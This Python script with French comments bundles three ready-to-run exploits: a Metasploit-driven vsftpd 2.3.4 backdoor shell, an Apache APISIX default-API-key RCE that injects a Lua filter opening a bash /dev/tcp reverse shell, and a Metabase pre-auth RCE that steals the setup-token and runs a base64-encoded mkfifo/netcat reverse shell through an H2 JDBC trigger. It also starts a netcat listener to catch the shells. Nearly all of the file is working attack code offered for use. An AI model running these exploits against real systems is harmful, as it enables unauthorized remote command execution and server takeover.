from pymetasploit3.msfrpc import MsfRpcClient
import re
from rich import print
from rich.console import Console
from rich.prompt import Prompt
import time
import requests
import threading
import subprocess
import base64

console = Console()

# Fonction pour démarrer notre listener netcat
def start_netcat_listener(lport):
    subprocess.run(["nc", "-nlvp", str(lport)])

# Fonction pour exploiter la backdoor VSFTPD
def exploit_vsftpd_backdoor(host, msf_pass):
    # Initialisation du client Metasploit RPC
    client = MsfRpcClient(msf_pass, ssl=True)
    
    # Nombre maximal de tentatives pour attendre une session
    max_retries = 5
    retries = 0

    while retries < max_retries:
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit_host = host
        exploit['RHOSTS'] = exploit_host
        
        exploit.execute(payload='cmd/unix/interact')
        
        time.sleep(2)

        session_list = client.sessions.list
        if session_list:
            session_id = next(iter(session_list))
            print(f"[green][+][/green] ID de session extrait : [green]{session_id}[/green]")

            shell = client.sessions.session(session_id)
            while True:
                command = Prompt.ask("[cyan][*][/cyan] Entrez une commande (ou 'exit' pour quitter) ")
                if command.lower() == 'exit':
                    shell.stop()  
                    return
                shell.write(command + '\n')  
                print(shell.read())
            break  # Sortir de la boucle principale si une session est trouvée
        
        # Incrémenter le nombre de tentatives et afficher un message d'attente
        retries += 1
        print(f"[yellow][!][/yellow] Tentative {retries} : En attente d'une session...")

    # Si aucune session n'a été trouvée après le nombre maximal de tentatives
    print("[yellow][!][/yellow] Aucune session trouvée après plusieurs tentatives.")

# Focntion pour exploiter la vulnérabilité de l'API APISIX
def exploit_apisix_default_token_rce(host, lhost, lport):
    # Headers HTTP pour la requête POST
    headers1 = {
        'Host': '127.0.0.1:9080',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'Content-Length': '540',
        'Connection': 'close',
    }
    
    # Headers HTTP pour la requête GET
    headers2 = {
        'Host': '127.0.0.1:9080',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'Connection': 'close',
    }
    
    # Données JSON à envoyer dans la requête POST
    json_data = {
        'headers': {
            'X-Real-IP': '127.0.0.1',
            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
            'Content-Type': 'application/json',
        },
        'timeout': 1500,
        'pipeline': [
            {
                'path': '/apisix/admin/routes/index',
                'method': 'PUT',
                'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1}},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/' + lhost + '/' + lport + ';sh <&160 >&160 2>&160\\\\\\"\'); return true end"}',
            },
        ],
    }
    
    print('[bold green][+][/bold green] Tapez [blue]"exit"[/blue] ou [blue]CTRL+C[/blue] pour terminer le reverse shell')

    # On démarre un thread pour netcat
    listener_thread = threading.Thread(target=start_netcat_listener, args=(lport,))
    listener_thread.start()

    # Envoie de la requête POST
    response1 = requests.post('http://' + host + ':9080' + '/apisix/batch-requests', headers=headers1, json=json_data, verify=False)
    
    # Envoie de la requête GET
    response2 = requests.get('http://' + host + ':9080' + '/rms/fzxewh', headers=headers2, verify=False)

# Fonction pour exploiter la vulnérabilité Metabase RCE
def exploit_metabase_preauth_rce(host, lhost, lport):
    def b64(command):
        command = command.strip()
        encoded = base64.b64encode(command.encode('ascii')).decode()
        equal_count = encoded.count('=')

        if equal_count >= 1:
            encoded = base64.b64encode(f'{command + " " * equal_count}'.encode('ascii')).decode()
        
        return encoded

    # URL de l'endpoint pour récupérer le setup-token
    session_properties_url = f"http://{host}:3000/api/session/properties"
    session_properties_response = requests.get(session_properties_url)

    if session_properties_response.status_code != 200:
        print(f"La requête a échoué sur l'endpoint {session_properties_url}")
        return
    
    # On parse pour récupérer le setup-token dans l'output en JSON
    session_properties_json = session_properties_response.json()
    token = session_properties_json.get("setup-token")
    print(f"[bold orange]Setup-token retrouvé: {token}[/bold orange]")
    if not token:
        print("Impossible de trouver le setup-token dans l'output en JSON")
        return
    
    # Endpoint pour la POST request
    url = f"http://{host}:3000/api/setup/validate"
    headers = {'Content-Type': 'application/json'}
    # Le rev shell
    payload = b64(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f")
    
    # Données JSON pour la requête POST avec notre payload
    data = {
    "token": token,
    "details": {
        "is_on_demand": "false",
        "is_full_sync": "false",
        "is_sample": "false",
        "cache_ttl": "null",
        "refingerprint": "false",
        "auto_run_queries": "true",
        "schedules": {},
        "details": {
            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
            "advanced-options": "false",
            "ssl": "true"
        },
        "name": "x",
        "engine": "h2"
    }
}

    print('[bold green][+][/bold green] Tapez [blue]"exit"[/blue] ou [blue]CTRL+C[/blue] pour terminer le reverse shell')
    
    # On démarre un thread pour netcat
    listener_thread = threading.Thread(target=start_netcat_listener, args=(lport,))
    listener_thread.start()
    
    # On envoie la request POST
    response = requests.post(url, headers=headers, json=data)




